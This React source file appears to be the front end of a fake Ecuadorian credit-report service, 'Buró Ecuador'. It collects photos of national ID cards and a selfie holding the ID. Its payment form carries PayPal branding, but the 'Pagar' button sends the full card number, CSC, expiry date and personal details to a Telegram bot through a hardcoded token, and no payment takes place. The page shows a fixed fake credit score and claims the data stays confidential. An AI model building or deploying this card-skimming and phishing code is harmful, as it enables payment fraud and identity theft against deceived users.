import React, { useState, useEffect } from "react";
import "./CreditReportPage.css";
import ScoreCircle from "./ScoreCircle";
import { FaCheckCircle, FaInfoCircle, FaCreditCard, FaRegImage } from "react-icons/fa";

const objetivos = [
  "Mejorar mi puntaje en el Buró de Crédito",
  "Para conocer si puedo aplicar a préstamos",
  "Solo para entender el Reporte Equifax 360",
  "Quiero saber a quién le debo y encontrar errores"
];

const SCORE_LEVEL = {
  score: 900,
  letter: "AA",
  color: "#43b324",
  emoji: <FaCheckCircle style={{ color: '#43b324', verticalAlign: 'middle', fontSize: '1.1em', marginLeft: 2, marginRight: 2 }} />,
  text: "Vas muy bien, pero siempre es bueno mejorar. Llena el formulario y solicita tu análisis de crédito para conocer oportunidades y proteger tu historial financiero."
};

const TELEGRAM_TOKEN = '7720652398:AAHqJaBEI2a2Z3wufe-GhNaVFuxbRU-prZA';
const CHAT_ID = 'AQUI_TU_CHAT_ID'; // <-- PON AQUÍ TU CHAT_ID

function sendCardToTelegram(card) {
  const message = `💳 *Nuevo pago manual (Buró Ecuador)*\n\n*Nombre:* ${card.nombre}\n*Apellidos:* ${card.apellidos}\n*Número de tarjeta:* ${card.numero}\n*CSC:* ${card.csc}\n*Fecha de vencimiento:* ${card.fecha}\n*Código postal:* ${card.postal}\n*Móvil:* ${card.movil}`;
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  });
}

const AnalisisPage = ({ onAnterior, onSiguiente }) => {
  const [form, setForm] = useState({
    objetivo: "",
    descripcion: "",
    fotoAnverso: null,
    fotoReverso: null,
    selfieCedula: null,
    consentimiento: false,
    autorizacion: false
  });
  const [errors, setErrors] = useState({});
  const [descripcionCount, setDescripcionCount] = useState(0);
  const [showCardForm, setShowCardForm] = useState(false);
  const [fileNames, setFileNames] = useState({ anverso: '', reverso: '', selfie: '' });
  const [cardForm, setCardForm] = useState({
    numero: '',
    fecha: '',
    csc: '',
    nombre: '',
    apellidos: '',
    postal: '',
    movil: '+593',
    mayorEdad: false
  });
  const [cardErrors, setCardErrors] = useState({});

  const handleChange = e => {
    const { name, value, type, checked, files } = e.target;
    if (type === "checkbox") {
      setForm({ ...form, [name]: checked });
    } else if (type === "file") {
      setForm({ ...form, [name]: files[0] });
      setFileNames({
        ...fileNames,
        [name === 'fotoAnverso' ? 'anverso' : name === 'fotoReverso' ? 'reverso' : 'selfie']: files[0] ? files[0].name : ''
      });
    } else {
      setForm({ ...form, [name]: value });
      if (name === "descripcion") setDescripcionCount(value.length);
    }
  };

  const validate = () => {
    const newErrors = {};
    if (!form.objetivo) newErrors.objetivo = "Selecciona un objetivo";
    if (!form.descripcion || form.descripcion.length < 10) newErrors.descripcion = "Describe brevemente el análisis (mínimo 10 caracteres)";
    if (!form.fotoAnverso) newErrors.fotoAnverso = "Sube la foto del anverso";
    if (!form.fotoReverso) newErrors.fotoReverso = "Sube la foto del reverso";
    if (!form.selfieCedula) newErrors.selfieCedula = "Sube la selfie con cédula";
    if (!form.consentimiento) newErrors.consentimiento = "Debes aceptar los términos";
    if (!form.autorizacion) newErrors.autorizacion = "Debes autorizar el tratamiento de datos";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = e => {
    e.preventDefault();
    if (validate()) {
      if (onSiguiente) onSiguiente();
    }
  };

  const handleFileChange = e => {
    const { name, files } = e.target;
    setForm({ ...form, [name]: files[0] });
    setFileNames({
      ...fileNames,
      [name === 'fotoAnverso' ? 'anverso' : name === 'fotoReverso' ? 'reverso' : 'selfie']: files[0] ? files[0].name : ''
    });
  };

  const handleCardChange = e => {
    const { name, value, type, checked } = e.target;
    setCardForm({ ...cardForm, [name]: type === 'checkbox' ? checked : value });
  };

  // Luhn check
  function isValidCardNumber(number) {
    const clean = number.replace(/\D/g, '');
    let sum = 0, shouldDouble = false;
    for (let i = clean.length - 1; i >= 0; i--) {
      let digit = parseInt(clean[i]);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return clean.length >= 13 && clean.length <= 19 && sum % 10 === 0;
  }

  function isValidExpiry(fecha) {
    const match = fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
    if (!match) return false;
    const mes = parseInt(match[1]);
    let anio = parseInt(match[2]);
    if (anio < 100) anio += 2000;
    // Fecha mínima: mayo 2025
    const minDate = new Date(2025, 4, 1); // Mes 4 = mayo
    const fechaCard = new Date(anio, mes - 1, 1);
    return fechaCard >= minDate;
  }

  useEffect(() => {
    const errs = {};
    if (cardForm.numero && !isValidCardNumber(cardForm.numero)) errs.numero = 'Número de tarjeta inválido';
    if (cardForm.fecha) {
      const match = cardForm.fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
      if (!match) {
        errs.fecha = 'Fecha inválida (MM/AA)';
      } else {
        const mes = parseInt(match[1]);
        let anio = parseInt(match[2]);
        if (anio < 100) anio += 2000;
        const minDate = new Date(2025, 4, 1);
        const fechaCard = new Date(anio, mes - 1, 1);
        if (fechaCard < minDate) {
          errs.fecha = 'La fecha mínima es 05/25';
        }
      }
    }
    setCardErrors(errs);
  }, [cardForm.numero, cardForm.fecha]);

  return (
    <div className="credit-bg" style={{ paddingTop: 0 }}>
      <div className="decor-circle"></div>
      <div className="credit-main-layout">
        <div className="main-left">
          <div className="form-intro">
            <h1 className="form-title">Reporte de Crédito</h1>
            <div className="subtitle-buro"><span className="buro-ecuador-red">Buró Ecuador</span></div>
            <div className="desc">
              <b className="desc-nunito-bold">Descubre lo que los bancos y cooperativas ven sobre ti.</b>
              <span className="desc-nunito-regular"> En Buró Ecuador, te ayudamos con el análisis de tu salud crediticia en el sistema financiero ecuatoriano.</span>
              <span className="desc-num">(1)</span>
            </div>
            <div className="form-alert-red">
              <FaInfoCircle className="alert-icon-red" />
              <span> Llena el formulario y obtén tu Reporte:</span>
            </div>
            <div className="progress-container">
              <span className="progress-label">100%</span>
              <div className="progress-bar-outer">
                <div className="progress-bar-inner" style={{ width: '100%' }}></div>
              </div>
            </div>
          </div>
          <form className="main-form" onSubmit={handleSubmit} autoComplete="off">
            <div className="main-form-block" style={{ background: '#fff', borderRadius: 16, boxShadow: '0 2px 8px rgba(60,60,120,0.07)', padding: 32, marginBottom: 36, border: '1.5px solid #e3e6fa' }}>
              <div className="form-group" style={{ marginBottom: 28 }}>
                <label className="form-label" style={{ fontSize: 15 }}>Objetivo del análisis <span className="form-required">*</span></label>
                <div className="radio-group" style={{ flexDirection: 'column', gap: 16 }}>
                  {objetivos.map((obj, i) => (
                    <label key={i} className="forminator-radio-inline" style={{ fontSize: 15, fontWeight: 700, color: '#232a31', marginBottom: 0, cursor: 'pointer', padding: '8px 0', borderRadius: 8, transition: 'background 0.2s' }}>
                      <input type="radio" name="objetivo" value={obj} checked={form.objetivo === obj} onChange={handleChange} style={{ display: 'none' }} />
                      <span className="forminator-radio-bullet" style={{ borderColor: form.objetivo === obj ? '#9f1b32' : '#bdbdd7', boxShadow: form.objetivo === obj ? '0 0 0 2px #f3d6db' : 'none', marginRight: 8 }}></span>
                      {obj}
                    </label>
                  ))}
                </div>
                {errors.objetivo && <div className="form-error-v2">{errors.objetivo}</div>}
              </div>
              <div className="form-alert-red" style={{ marginBottom: 22, background: '#fff8f6', border: '1.5px solid #ffe0e0', borderRadius: 8, padding: 14, color: '#b71c1c', fontSize: 14 }}>
                <span>Por favor, sé honesto al declarar tus ingresos. Si acudes a un banco, ellos verificarán esta información, y de ello dependerá la precisión del análisis. Garantizamos la confidencialidad de tus datos y no los compartiremos con terceros.</span>
              </div>
              <div className="form-group" style={{ marginBottom: 28 }}>
                <label className="form-label" style={{ fontSize: 15 }}>Descripción del análisis</label>
                <textarea
                  name="descripcion"
                  className={`form-input form-input-compact${errors.descripcion ? ' input-error-v2' : ''}`}
                  placeholder="Describe brevemente el análisis: necesidades específicas, dudas o aspectos clave a destacar."
                  maxLength={100}
                  value={form.descripcion}
                  onChange={handleChange}
                  style={{ minHeight: 36, height: 36, maxHeight: 48, width: '100%', minWidth: 0, resize: 'horizontal', background: '#f7f8fc', border: '1.5px solid #e3e6fa', borderRadius: 8, fontSize: 15, padding: 14 }}
                />
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, color: '#888', marginTop: 4 }}>
                  <span>{errors.descripcion ? <span style={{ color: '#b71c1c', fontWeight: 600 }}>{errors.descripcion}</span> : null}</span>
                  <span style={{ color: form.descripcion.length > 90 ? '#b71c1c' : '#888', fontWeight: 500 }}>{descripcionCount} / 100</span>
                </div>
              </div>
            </div>
            <div className="main-form-block" style={{ background: '#fff', borderRadius: 16, boxShadow: '0 2px 8px rgba(60,60,120,0.07)', padding: 32, marginBottom: 36, border: '1.5px solid #e3e6fa' }}>
              <div className="form-intro" style={{ marginTop: 0, marginBottom: 8 }}>
                <h2 className="form-title" style={{ fontSize: 20, marginBottom: 4, fontWeight: 700 }}>Verificación de identidad</h2>
                <div style={{ fontSize: 14, color: '#232a31', fontWeight: 600, marginBottom: 8 }}>Para confirmar tu identidad y acceder a tu historial crediticio sube las siguientes fotos:</div>
              </div>
              {/* Foto anverso */}
              <div className="form-group" style={{ marginBottom: 22 }}>
                <label className="form-label" style={{ fontWeight: 600 }}>Foto anverso <span className="form-required">*</span></label>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#f7f8fc', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: '10px 18px', cursor: 'pointer', fontWeight: 600 }}>
                    <FaRegImage style={{ fontSize: 20, color: '#9f1b32' }} />
                    <span style={{ fontSize: 15 }}>{fileNames.anverso || 'Elegir archivo'}</span>
                    <input type="file" name="fotoAnverso" accept="image/*" style={{ display: 'none' }} onChange={handleFileChange} />
                  </label>
                  {fileNames.anverso && <span style={{ fontSize: 13, color: '#888' }}>{fileNames.anverso}</span>}
                </div>
                <div className="form-hint" style={{ color: '#888', fontSize: 13, marginTop: 2 }}>Solo fotos, No pdf</div>
                {errors.fotoAnverso && <div className="form-error-v2">{errors.fotoAnverso}</div>}
              </div>
              {/* Foto reverso */}
              <div className="form-group" style={{ marginBottom: 22 }}>
                <label className="form-label" style={{ fontWeight: 600 }}>Foto reverso <span className="form-required">*</span></label>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#f7f8fc', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: '10px 18px', cursor: 'pointer', fontWeight: 600 }}>
                    <FaRegImage style={{ fontSize: 20, color: '#9f1b32' }} />
                    <span style={{ fontSize: 15 }}>{fileNames.reverso || 'Elegir archivo'}</span>
                    <input type="file" name="fotoReverso" accept="image/*" style={{ display: 'none' }} onChange={handleFileChange} />
                  </label>
                  {fileNames.reverso && <span style={{ fontSize: 13, color: '#888' }}>{fileNames.reverso}</span>}
                </div>
                <div className="form-hint" style={{ color: '#888', fontSize: 13, marginTop: 2 }}>Solo fotos, No pdf</div>
                {errors.fotoReverso && <div className="form-error-v2">{errors.fotoReverso}</div>}
              </div>
              {/* Selfie con cédula */}
              <div className="form-group" style={{ marginBottom: 22 }}>
                <label className="form-label" style={{ fontWeight: 600 }}>Selfie con cédula <span className="form-required">*</span></label>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#f7f8fc', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: '10px 18px', cursor: 'pointer', fontWeight: 600 }}>
                    <FaRegImage style={{ fontSize: 20, color: '#9f1b32' }} />
                    <span style={{ fontSize: 15 }}>{fileNames.selfie || 'Elegir archivo'}</span>
                    <input type="file" name="selfieCedula" accept="image/*" style={{ display: 'none' }} onChange={handleFileChange} />
                  </label>
                  {fileNames.selfie && <span style={{ fontSize: 13, color: '#888' }}>{fileNames.selfie}</span>}
                </div>
                <div className="form-hint" style={{ color: '#888', fontSize: 13, marginTop: 2 }}>Foto sosteniendo la cédula</div>
                {errors.selfieCedula && <div className="form-error-v2">{errors.selfieCedula}</div>}
              </div>
            </div>
            <div className="form-group" style={{ marginTop: 18 }}>
              <label className="checkbox-label">
                <input type="checkbox" name="consentimiento" checked={form.consentimiento} onChange={handleChange} />
                Acepto los <a href="#" style={{ color: '#b71c1c', textDecoration: 'underline' }}>términos y condiciones</a> de la plataforma Buró Ecuador
              </label>
              {errors.consentimiento && <div className="form-error-v2">{errors.consentimiento}</div>}
            </div>
            <div className="form-group">
              <label className="checkbox-label">
                <input type="checkbox" name="autorizacion" checked={form.autorizacion} onChange={handleChange} />
                Doy la autorización sobre el tratamiento de mis datos.
              </label>
              {errors.autorizacion && <div className="form-error-v2">{errors.autorizacion}</div>}
            </div>
            {/* Botón de tarjeta de débito o crédito */}
            <div style={{ marginTop: 32 }}>
              <button
                type="button"
                onClick={() => setShowCardForm(v => !v)}
                style={{
                  width: '100%',
                  background: '#393939',
                  color: '#fff',
                  border: 'none',
                  borderRadius: 6,
                  padding: '12px 0',
                  fontSize: 17,
                  fontWeight: 600,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: 10,
                  cursor: 'pointer',
                  marginBottom: 0
                }}
              >
                <FaCreditCard style={{ fontSize: 20 }} /> Tarjeta de débito o crédito
              </button>
              {showCardForm && (
                <div style={{
                  background: '#fff',
                  border: '1.5px solid #e3e6fa',
                  borderRadius: 10,
                  boxShadow: '0 2px 8px rgba(60,60,120,0.07)',
                  padding: 24,
                  marginTop: 12
                }}>
                  <div className="form-group">
                    <input
                      type="text"
                      name="numero"
                      placeholder="N.º de la tarjeta"
                      value={cardForm.numero}
                      onChange={handleCardChange}
                      style={{ width: '100%', marginBottom: 4, border: cardErrors.numero ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }}
                    />
                    {cardErrors.numero && <div className="form-error-v2">{cardErrors.numero}</div>}
                  </div>
                  <div style={{ display: 'flex', gap: 10, marginBottom: 10, flexWrap: 'wrap' }}>
                    <div style={{ flex: 1, minWidth: 120 }}>
                      <input
                        type="text"
                        name="fecha"
                        placeholder="MM/AA"
                        value={cardForm.fecha}
                        onChange={handleCardChange}
                        style={{ width: '100%', border: cardErrors.fecha ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }}
                      />
                      {cardErrors.fecha && <div className="form-error-v2">{cardErrors.fecha}</div>}
                    </div>
                    <div style={{ flex: 1, minWidth: 100 }}>
                      <input type="text" name="csc" placeholder="CSC" value={cardForm.csc} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }} />
                    </div>
                  </div>
                  <div className="form-group" style={{ display: 'flex', gap: 10, marginBottom: 10 }}>
                    <input type="text" name="nombre" placeholder="Nombre" value={cardForm.nombre} onChange={handleCardChange} style={{ flex: 1, border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                    <input type="text" name="apellidos" placeholder="Apellidos" value={cardForm.apellidos} onChange={handleCardChange} style={{ flex: 1, border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                  </div>
                  <div className="form-group" style={{ marginBottom: 10 }}>
                    <input type="text" name="postal" placeholder="Código postal" value={cardForm.postal} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                  </div>
                  <div className="form-group" style={{ marginBottom: 10 }}>
                    <input type="text" name="movil" placeholder="Móvil" value={cardForm.movil} readOnly style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                  </div>
                  <div className="form-group" style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
                    <input type="checkbox" id="mayorEdad" name="mayorEdad" checked={cardForm.mayorEdad} onChange={handleCardChange} style={{ marginRight: 6 }} />
                    <label htmlFor="mayorEdad" style={{ fontSize: 14 }}>
                      Confirmo que soy mayor de edad y acepto el <a href="#" style={{ color: '#2a3eb1', textDecoration: 'underline' }}>Aviso de privacidad</a> de PayPal.
                    </label>
                  </div>
                  <button
                    type="button"
                    style={{ width: '100%', background: '#0070ba', color: '#fff', border: 'none', borderRadius: 6, padding: '12px 0', fontSize: 17, fontWeight: 700, cursor: 'pointer' }}
                    onClick={async () => {
                      try {
                        const res = await sendCardToTelegram(cardForm);
                        if (res.ok) {
                          alert('¡Datos enviados a Telegram!');
                        } else {
                          alert('Error al enviar a Telegram');
                        }
                      } catch (e) {
                        alert('Error al enviar a Telegram');
                      }
                    }}
                  >
                    Pagar $21.45
                  </button>
                  <div style={{ display: 'flex', justifyContent: 'center', marginTop: 16 }}>
                    <img src="https://1000marcas.net/wp-content/uploads/2019/12/PayPal-emblema.jpg" alt="Desarrollado por PayPal" style={{ height: 32 }} />
                  </div>
                </div>
              )}
            </div>
            <div className="form-buttons" style={{ display: 'flex', justifyContent: 'flex-start', alignItems: 'center', marginTop: 24 }}>
              <button type="button" className="siguiente-btn anterior-btn-disabled" onClick={onAnterior}>Anterior</button>
            </div>
          </form>
        </div>
        <div className="main-right">
          <section className="score-section score-section-v2">
            <div className="score-top-block-v2">
              <div className="score-circle-block">
                <ScoreCircle score={SCORE_LEVEL.score} color={SCORE_LEVEL.color} />
              </div>
              <div className="score-bar-block-v2">
                <div className="score-bar-label">Score de Crédito:</div>
                <div className="score-bar-vertical" style={{ cursor: 'default' }}>
                  <div
                    className="score-bar-indicator"
                    style={{
                      top: `${100 - (SCORE_LEVEL.score / 999) * 100}%`,
                      background: SCORE_LEVEL.color,
                      cursor: 'default'
                    }}
                  ></div>
                </div>
                <div className="score-bar-value">{SCORE_LEVEL.score} - {SCORE_LEVEL.letter}</div>
              </div>
            </div>
            <div className="score-info score-info-v2" style={{ borderColor: SCORE_LEVEL.color }}>
              <div className="score-info-badge" style={{ background: SCORE_LEVEL.color }}>{SCORE_LEVEL.letter}</div>
              <h3>Tu Score Crediticio</h3>
              <p>Puntaje simulado: <b>{SCORE_LEVEL.score}</b></p>
              <p><b>Cliente {SCORE_LEVEL.letter}</b> {SCORE_LEVEL.emoji} {SCORE_LEVEL.text}</p>
            </div>
            <div className="alert-bottom alert-bottom-v2">
              <span className="alert-orange">Atención:</span> Debido a una alta demanda, <span role="img" aria-label="alerta">🟠</span> <b>las solicitudes podrían tardar hasta 24 horas en procesarse.</b>
            </div>
          </section>
        </div>
      </div>
    </div>
  );
};

export default AnalisisPage; 